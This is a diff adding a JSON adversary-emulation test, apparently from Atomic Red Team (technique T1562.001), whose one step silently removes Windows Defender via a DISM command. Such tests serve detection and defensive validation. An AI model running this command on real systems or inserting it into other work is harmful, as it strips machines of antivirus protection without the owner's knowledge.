@@ -1,0 +1,23 @@
+{
+  "id": "871438ac-7d6e-432a-b27d-3e7db69faf58",
+  "name": "Disable Windows Defender with DISM",
+  "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "87a13134-d66a-4266-b17b-84ac31f55296",
+      "type": "execute-command",
+      "data": {
+        "command": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1562.001",
+    "atomic-red-team"
+  ]
+}
